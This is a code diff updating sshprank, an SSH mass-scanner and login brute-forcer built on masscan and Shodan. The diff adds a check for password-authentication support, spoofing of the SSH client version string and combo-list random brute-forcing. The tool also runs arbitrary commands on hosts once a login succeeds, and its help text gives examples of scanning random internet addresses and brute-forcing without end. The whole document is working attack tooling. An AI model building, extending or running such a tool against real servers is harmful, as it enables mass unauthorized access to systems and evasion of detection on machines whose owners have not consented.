@@ -7,8 +7,8 @@
 #                                           /___/ team                         #
 #                                                                              #
 # sshprank                                                                     #
-# A fast SSH mass-scanner, login cracker and banner grabber tool using the     #
-# python-masscan and shodan module.                                            #
+# A fast SSH mass-scanner, login cracker, banner grabber and password auth
+# checker tool using the python-masscan and shodan module.
 #                                                                              #
 # NOTES                                                                        #
 # quick'n'dirty code                                                           #
@@ -26,6 +26,7 @@ import socket
 import time
 import random
 import ipaddress
+import threading
 from concurrent.futures import \
   ThreadPoolExecutor, as_completed, wait, ALL_COMPLETED
 import warnings
@@ -38,7 +39,7 @@ from collections import deque
 
 
 __author__ = 'noptrix'
-__version__ = '1.5.0'
+__version__ = '1.6.0'
 __copyright = 'santa clause'
 __license__ = 'MIT'
 
@@ -53,8 +54,7 @@ GREEN = '\033[1;32;10m'
 YELLOW = '\033[1;33;10m'
 BLUE = '\033[1;34;10m'
 
-BANNER = BLUE + r'''
-              __                           __
+BANNER = BLUE + r'''              __                           __
    __________/ /_  ____  _________ _____  / /__
   / ___/ ___/ __ \/ __ \/ ___/ __ `/ __ \/ //_/
  (__  |__  ) / / / /_/ / /  / /_/ / / / / ,<
@@ -93,6 +93,10 @@ HELP = BOLD + '''usage''' + NORM + '''
                           format: <host>[:ports]. multiple ports can be
                           separated by comma (default port: 22)
 
+  -p <hosts[:ports]>    - check sshd(s) for password auth support.
+                          single host or host list file. format same
+                          as '-h' option. (default port: 22)
+
 ''' + BOLD + '''scan options''' + NORM + '''
 
   -r <num>              - generate <num> random ipv4 addresses, check for open
@@ -100,8 +104,8 @@ HELP = BOLD + '''usage''' + NORM + '''
 
 ''' + BOLD + '''credential options''' + NORM + '''
 
-  -u <user|file>        - single username or user list (default: root)
-  -p <pass|file>        - single password or password list (default: root)
+  -U <user|file>        - single username or user list (default: root)
+  -P <pass|file>        - single password or password list (default: root)
   -c <file>             - list of user:pass combination
 
 ''' + BOLD + '''brute options''' + NORM + '''
@@ -112,7 +116,7 @@ HELP = BOLD + '''usage''' + NORM + '''
   -z                    - shuffle target list randomly before cracking
                           (only with -h <file>). saves to 'random_targets.txt'
   -Z <num>              - random brute: pick random target + creds each attempt.
-                          <num> total attempts, 0 = infinite (use with -h, -u/-p)
+                          <num> total attempts, 0 = infinite (use with -h, -U/-P)
 
 ''' + BOLD + '''exec options''' + NORM + '''
 
@@ -141,17 +145,19 @@ HELP = BOLD + '''usage''' + NORM + '''
 
 ''' + BOLD + '''misc options''' + NORM + '''
 
+  -i <str>              - spoof ssh client version string sent to sshd
+                          (default: paramiko's default version string)
   -H                    - print help
   -V                    - print version information
 
 ''' + BOLD + '''examples''' + NORM + '''
 
   # crack targets from a given list with user admin, pw-list and 20 host-threads
-  $ sshprank -h sshds.txt -u admin -p /tmp/passlist.txt -x 20
+  $ sshprank -h sshds.txt -U admin -P /tmp/passlist.txt -x 20
 
   # first scan then crack from founds ssh services using 'root:admin'
   $ sudo sshprank -m '-p22,2022 --rate 5000 --source-ip 192.168.13.37 \\
-    --range 192.168.13.1/24' -p admin
+    --range 192.168.13.1/24' -P admin
 
   # generate 1k random ipv4 addresses, then port-scan (tcp/22 here) with 1k p/s
   # and crack logins using 'root:root' on found sshds
@@ -164,18 +170,29 @@ HELP = BOLD + '''usage''' + NORM + '''
   # grab banners and output to file with format supported for '-h' option
   $ sshprank -b hosts.txt > sshds2.txt
 
+  # check if sshds support password auth
+  $ sshprank -p sshds.txt -v
+
   # shuffle target list and crack
-  $ sshprank -h sshds.txt -z -u root -p /tmp/passes.txt
+  $ sshprank -h sshds.txt -z -U root -P /tmp/passes.txt
 
   # random brute: 500 random attempts from ip/user/pass lists
-  $ sshprank -h sshds.txt -u /tmp/users.txt -p /tmp/passes.txt -Z 500
+  $ sshprank -h sshds.txt -U /tmp/users.txt -P /tmp/passes.txt -Z 500
 
   # random brute infinite (ctrl+c to stop)
-  $ sshprank -h sshds.txt -u /tmp/users.txt -p /tmp/passes.txt -Z 0
+  $ sshprank -h sshds.txt -U /tmp/users.txt -P /tmp/passes.txt -Z 0
+
+  # spoof ssh client version and crack
+  $ sshprank -h sshds.txt -i 'SSH-2.0-OpenSSH_8.9p1'
+
+  # check pwauth with spoofed version
+  $ sshprank -p sshds.txt -i 'SSH-2.0-OpenSSH_7.4' -v
 '''
 
 stargets = []   # shodan
 excluded = {}
+excluded_hosts = set()
+_log_lock = threading.Lock()
 opts = {
   'targets': [],
   'targetlist': [],
@@ -200,7 +217,8 @@ opts = {
   'exit': False,
   'shuffle': False,
   'randbrute': None,
-  'verbose': False
+  'verbose': False,
+  'sshver': None
 }
 
 
@@ -258,7 +276,7 @@ def read_file(_file):
   try:
     with open(_file, 'r', encoding='latin-1') as f:
       with mmap.mmap(f.fileno(), length=0, access=mmap.ACCESS_READ) as m:
-        return m.read().decode('latin-1').split()
+        return [l for l in m.read().decode('latin-1').splitlines() if l.strip()]
   except:
     log(f'could not read from {_file}', 'error')
 
@@ -268,7 +286,7 @@ def parse_cmdline(cmdline):
 
   try:
     _opts, _args = getopt.getopt(cmdline,
-      'h:m:s:b:r:u:p:c:C:Nx:S:X:B:T:R:o:eEzZ:vVH')
+      'h:m:s:b:p:r:U:P:c:C:Nx:S:X:B:T:R:o:i:eEzZ:vVH')
     for o, a in _opts:
       if o == '-h':
         if os.path.isfile(a):
@@ -281,14 +299,19 @@ def parse_cmdline(cmdline):
         opts['sho_opts'] = a
       if o == '-b':
         opts['targetlist'] = a
+      if o == '-p':
+        if os.path.isfile(a):
+          opts['targetlist'] = a
+        else:
+          opts['targets'] = parse_target(a)
       if o == '-r':
         opts['random'] = int(a)
-      if o == '-u':
+      if o == '-U':
         if os.path.isfile(a):
           opts['userlist'] = read_file(a)
         else:
           opts['user'] = a
-      if o == '-p':
+      if o == '-P':
         if os.path.isfile(a):
           opts['passlist'] = read_file(a)
         else:
@@ -313,6 +336,8 @@ def parse_cmdline(cmdline):
         opts['rtimeout'] = int(a)
       if o == '-o':
         opts['logfile'] = a
+      if o == '-i':
+        opts['sshver'] = a
       if o == '-e':
         opts['exclude'] = True
       if o == '-E':
@@ -337,22 +362,30 @@ def parse_cmdline(cmdline):
 
 def check_argv(cmdline):
   modes = False
-  needed = ['-h', '-m', '-s', '-b', '-H', '-V']
+  needed = ['-h', '-m', '-s', '-b', '-p', '-H', '-V']
 
   if set(needed).isdisjoint(set(cmdline)):
     log('wrong usage dude, check help', 'error')
 
   if '-h' in cmdline:
-    if '-m' in cmdline or '-s' in cmdline or '-b' in cmdline:
+    if '-m' in cmdline or '-s' in cmdline or \
+        '-b' in cmdline or '-p' in cmdline:
       modes = True
   if '-m' in cmdline:
-    if '-h' in cmdline or '-s' in cmdline or '-b' in cmdline:
+    if '-h' in cmdline or '-s' in cmdline or \
+        '-b' in cmdline or '-p' in cmdline:
       modes = True
   if '-s' in cmdline:
-    if '-h' in cmdline or '-m' in cmdline or '-b' in cmdline:
+    if '-h' in cmdline or '-m' in cmdline or \
+        '-b' in cmdline or '-p' in cmdline:
       modes = True
   if '-b' in cmdline:
-    if '-h' in cmdline or '-m' in cmdline or '-s' in cmdline:
+    if '-h' in cmdline or '-m' in cmdline or \
+        '-s' in cmdline or '-p' in cmdline:
+      modes = True
+  if '-p' in cmdline:
+    if '-h' in cmdline or '-m' in cmdline or \
+        '-s' in cmdline or '-b' in cmdline:
       modes = True
 
   if modes:
@@ -373,7 +406,7 @@ def grab_banner(host, port):
   try:
     s = socket.create_connection((host, port), opts['ctimeout'])
     s.settimeout(opts['rtimeout'])
-    banner = str(s.recv(1024).decode('utf-8')).strip()
+    banner = str(s.recv(1024).decode('utf-8', errors='replace')).strip()
     if not banner:
       banner = '<NO BANNER>'
     log(f'{host}:{port}:{banner}\n')
@@ -405,7 +438,7 @@ def portscan():
     log('no sshds found or network unreachable', 'error')
   except Exception as err:
     log('\n')
-    log(f'unknown masscan error occured: str({err})', 'error')
+    log(f'unknown masscan error occured: {err}', 'error')
 
   return m
 
@@ -434,8 +467,9 @@ def grep_service(scan, service='ssh', prot='tcp'):
 
 def log_targets(targets, logfile):
   try:
-    with open(logfile, 'a+') as f:
-      f.writelines(targets)
+    with _log_lock:
+      with open(logfile, 'a+') as f:
+        f.writelines(targets)
   except (FileNotFoundError, PermissionError) as err:
     log(f'{err.args[1].lower()}: {logfile}', 'error')
 
@@ -450,19 +484,19 @@ def status(future, msg, pre_esc=''):
 
 
 def crack_login(host, port, username, password):
-  global excluded
+  global excluded, excluded_hosts
 
   cli = paramiko.SSHClient()
   cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
   try:
-    if port not in excluded[host]:
+    if host not in excluded_hosts and port not in excluded[host]:
       cli.connect(host, port, username, password, timeout=opts['ctimeout'],
         allow_agent=False, look_for_keys=False, auth_timeout=opts['ctimeout'])
       login = f'{host}:{port}:{username}:{password}'
       log_targets(f'{login}\n', opts['logfile'])
       if opts['exclude']:
-        excluded[host].add(port)
+        excluded_hosts.add(host)
       if opts['verbose']:
         log(f'found login: {login}', _type='good')
       else:
@@ -471,22 +505,36 @@ def crack_login(host, port, username, password):
         if os.path.isfile(opts['cmd']):
           log(f"sending ssh commands from {opts['cmd']}", 'info')
           with open(opts['cmd'], 'r', encoding='latin-1') as _file:
-            for line in _file:
-              stdin, stdout, stderr = cli.exec_command(line, timeout=2)
+            for cmd in _file:
+              cmd = cmd.rstrip()
+              if not cmd:
+                continue
+              stdin, stdout, stderr = cli.exec_command(cmd, timeout=2)
               if not opts['cmd_no_out']:
                 rl = stdout.readlines()
+                el = stderr.readlines()
                 if len(rl) > 0:
-                  log(f'ssh command result for: \'{line.rstrip()}\'', 'good',
-                    pre_esc='\n')
-                  for line in rl:
-                    log(f'{line}')
+                  log(f'ssh command result for: \'{cmd}\'', 'good', pre_esc='\n')
+                  for out in rl:
+                    log(f'{out}')
+                if len(el) > 0:
+                  log(f'ssh command stderr for: \'{cmd}\'', 'warn', pre_esc='\n')
+                  for err in el:
+                    log(f'{err}')
         else:
           log('sending your single ssh command line', 'info')
+          stdin, stdout, stderr = cli.exec_command(opts['cmd'], timeout=2)
           if not opts['cmd_no_out']:
-            stdin, stdout, stderr = cli.exec_command(opts['cmd'], timeout=2)
-            log(f"ssh command results for \'{opts['cmd'].rstrip()}\'", 'good')
-            for line in stdout.readlines():
-              log(line)
+            rl = stdout.readlines()
+            el = stderr.readlines()
+            if len(rl) > 0:
+              log(f"ssh command result for \'{opts['cmd'].rstrip()}\'", 'good')
+              for out in rl:
+                log(out)
+            if len(el) > 0:
+              log(f"ssh command stderr for \'{opts['cmd'].rstrip()}\'", 'warn')
+              for err in el:
+                log(err)
       if opts['exit']:
         log('game over', 'info')
         os._exit(SUCCESS)
@@ -547,7 +595,7 @@ def run_threads(host, ports, val='single'):
         if 'combolist' in opts:
           for line in opts['combolist']:
             try:
-              l = line.split(':')
+              l = line.split(':', 1)
               exe.submit(crack_login, host, port, l[0].rstrip(), l[1].rstrip())
             except IndexError:
               log('combo list format: <user>:<pass>', 'error')
@@ -595,6 +643,7 @@ def crack_rand_brute():
 
   users = opts.get('userlist', [opts['user']])
   passwords = opts.get('passlist', [opts['pass']])
+  combos = opts.get('combolist', [])
   count = opts['randbrute']
   i = 0
 
@@ -606,8 +655,14 @@ def crack_rand_brute():
         parsed = parse_target(target)
         host = list(parsed.keys())[0]
         port = random.choice(parsed[host])
-        user = random.choice(users).rstrip()
-        passwd = random.choice(passwords).rstrip()
+        if combos:
+          line = random.choice(combos)
+          parts = line.split(':', 1)
+          user = parts[0].rstrip()
+          passwd = parts[1].rstrip() if len(parts) > 1 else ''
+        else:
+          user = random.choice(users).rstrip()
+          passwd = random.choice(passwords).rstrip()
         if host not in excluded:
           excluded[host] = set()
         exe.submit(crack_login, host, port, user, passwd)
@@ -693,6 +748,71 @@ def check_banners():
   return
 
 
+def check_pwauth(host, port):
+  sock = None
+  t = None
+  try:
+    sock = socket.create_connection(
+      (host, int(port)), timeout=opts['ctimeout']
+    )
+    t = paramiko.Transport(sock)
+    sec = t.get_security_options()
+    try:
+      import paramiko.transport as _pt
+      sec.kex = list(_pt.Transport._preferred_kex)
+      sec.ciphers = list(_pt._ENCRYPT.keys())
+      sec.digests = list(_pt._MAC_INFO.keys())
+    except Exception:
+      pass
+    t.start_client(timeout=opts['ctimeout'])
+    t.auth_password('nobody', 'x')
+    log(f'{host}:{port}:pwauth=yes\n')
+    if opts['verbose']:
+      log(f'pwauth enabled: {host}:{port}', 'good')
+  except paramiko.BadAuthenticationType as err:
+    allowed = ','.join(err.allowed_types)
+    log(f'{host}:{port}:pwauth=no ({allowed})\n')
+    if opts['verbose']:
+      log(f'pwauth disabled: {host}:{port} ({allowed})', 'warn')
+  except paramiko.AuthenticationException:
+    log(f'{host}:{port}:pwauth=yes\n')
+    if opts['verbose']:
+      log(f'pwauth enabled: {host}:{port}', 'good')
+  except (paramiko.ssh_exception.NoValidConnectionsError,
+      socket.error):
+    if opts['verbose']:
+      log(f'could not connect: {host}:{port}', 'warn')
+  except paramiko.SSHException as err:
+    if opts['verbose']:
+      log(f'ssh error: {host}:{port} ({str(err)})', 'warn')
+  except Exception as err:
+    if opts['verbose']:
+      log(f'other error: {host}:{port} ({str(err)})', 'warn')
+  finally:
+    if t:
+      t.close()
+    if sock:
+      sock.close()
+
+  return
+
+
+def check_pwauths():
+  try:
+    with open(opts['targetlist'], 'r', encoding='latin-1') as fh:
+      with ThreadPoolExecutor(opts['bthreads']) as exe:
+        for line in fh:
+          target = parse_target(line)
+          host = ''.join([*target])
+          ports = target.get(host)
+          for port in ports:
+            exe.submit(check_pwauth, host, port)
+  except (FileNotFoundError, PermissionError) as err:
+    log(f"{err.args[1].lower()}: {opts['targetlist']}", 'error')
+
+  return
+
+
 def crack_shodan(targets):
   log(f'w00t w00t, found {len(targets)} sshds', 'good')
   log('cracking shodan targets', 'info')
@@ -713,8 +833,8 @@ def shodan_search():
   if len(s) != 3:
     log('format wrong, check usage and examples', 'error')
   opts['sho_str'] = s[0]
-  opts['sho_page'] = s[1]
-  opts['sho_lim'] = s[2]
+  opts['sho_page'] = int(s[1])
+  opts['sho_lim'] = int(s[2])
 
   try:
     api = shodan.Shodan(opts['sho_key'])
@@ -745,12 +865,16 @@ def main(cmdline):
   parse_cmdline(cmdline)
   check_argv(cmdline)
 
+  if opts['sshver']:
+    paramiko.Transport.local_version = opts['sshver']
+
   log('game started', 'info')
   try:
     if not opts['targetlist'] and opts['targets']:
       log('cracking single target', 'info')
       crack_single()
-    elif len(opts['targetlist']) > 0 and '-b' not in cmdline:
+    elif len(opts['targetlist']) > 0 and '-b' not in cmdline \
+        and '-p' not in cmdline:
       if opts['shuffle']:
         shuffle_targets()
       if opts['randbrute'] is not None:
@@ -785,9 +909,16 @@ def main(cmdline):
     elif '-b' in cmdline:
       log('grabbing banners', 'info', esc='\n')
       check_banners()
+    elif '-p' in cmdline:
+      log('checking password auth', 'info', esc='\n')
+      if not opts['targetlist'] and opts['targets']:
+        host, ports = list(opts['targets'].copy().items())[0]
+        for port in ports:
+          check_pwauth(host, port)
+      else:
+        check_pwauths()
   except KeyboardInterrupt:
-    log('\n')
-    log('you aborted me', _type='warn')
+    log('you aborted me', _type='warn', pre_esc='\r  \r')
     os._exit(SUCCESS)
   finally:
     log('game over', 'info')
